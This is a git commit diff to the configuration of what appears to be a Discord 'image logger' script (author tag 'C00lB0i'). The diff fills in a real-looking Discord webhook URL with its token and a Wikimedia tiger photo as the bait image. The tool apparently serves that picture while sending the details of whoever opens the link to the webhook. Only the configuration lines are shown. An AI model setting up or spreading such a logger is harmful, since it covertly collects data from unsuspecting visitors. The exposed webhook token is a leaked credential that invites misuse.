7cea6d64cf424d02a160cadd6f2635d21d4c4350
Haramnumber1 <lemast2015@gmail.com>
2025-06-19 19:27:22 +0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1385294512041230477/nIU7GDOt6ahfmt7s3v1qoF3_CszgdF6IQy8sIMTssfJSCJ3TLLwQgAZJMMsKHiV75LuL",
+    "image": "https://upload.wikimedia.org/wikipedia/commons/7/71/Sibirischer_tiger_de_edit02.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
